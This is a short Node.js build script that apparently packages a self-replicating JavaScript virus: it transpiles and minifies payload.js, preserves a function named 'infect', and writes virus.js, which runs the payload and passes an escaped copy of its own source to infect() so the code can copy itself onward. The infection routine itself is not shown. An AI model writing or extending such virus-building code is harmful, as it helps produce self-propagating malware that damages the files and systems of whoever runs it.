const fsp     = require( "fs-promise" );
const winston = require( "winston" );
const ugly    = require( "uglify-js" );
const babel   = require( "babel-core" );

function escaper(str) {
  return str.replace(/["\\]/g, "\\$&");
}

async function build() {
    var src  = await fsp.readFile( "payload.js", "utf8" );
    var compiledES16 = babel.transform( src, { presets : require.resolve( "babel-preset-es2017" ) } ).code;
    var uglied = ugly.minify( compiledES16, { fromString : true, mangle : { except : [ "infect" ] } } ).code;
    var payload = JSON.stringify( uglied );

    await fsp.writeFile( "virus.js", `(function() {
        ${JSON.parse(payload)}
        infect( "${escaper(payload)}" );
    })();` );
}

build()
    .then( () => winston.info( "BUILD SUCCEEDED" ) )
    .catch( e => winston.info( "BUILD FAILED", e ) );
